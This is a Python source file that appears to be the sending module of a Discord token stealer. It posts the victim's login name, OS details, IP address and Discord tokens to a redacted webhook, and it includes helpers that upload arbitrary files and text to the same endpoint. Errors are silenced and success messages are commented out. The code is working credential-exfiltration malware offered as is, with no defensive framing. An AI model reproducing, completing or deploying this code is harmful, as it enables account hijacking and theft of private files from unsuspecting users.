# requests and some other shennanigans
import requests #dependency

import os
import platform

url = "[redacted]"
def sendTokens(ip, tokens):
    message = { }
    message["embeds"] = [
        {
            "color" : 26112,
            "fields" : [
                {
                    "name" : "PC User",
                    "value" : os.getlogin(),
                    "inline" : True,
                },
                {
                    "name" : "OS ",
                    "value" : platform.platform(),
                    "inline" : True,
                },
                {
                    "name" : "IP Address",
                    "value" : str(ip),
                    "inline" : True,
                },
                {
                    "name" : "Discord Token(s)",
                    "value" : str(tokens),
                }
            ]
        }
    ]
    result = requests.post(url, json = message)

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        pass
    else:
        #print("Payload delivered successfully, code {}.".format(result.status_code))
        pass

def sendVal(name, value):
    message = { }
    message["embeds"] = [
        {
            "color" : 26112,
            "fields" : [
                {
                    "name" : str(name),
                    "value" : str(value),
                }
            ]
        }
    ]
    result = requests.post(url, json = message)

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        pass
    else:
        #print("Payload delivered successfully, code {}.".format(result.status_code))
        pass

def sendFile(name, file_path):

    result = requests.post(url, files = {name : open(file_path, "rb")})

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        pass
    else:
       # print("Payload delivered successfully, code {}.".format(result.status_code))
       pass

def sendTxt(name, text):
    result = requests.post(url, files = {name : str(text)})

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        pass
    else:
        #print("Payload delivered successfully, code {}.".format(result.status_code))
        pass
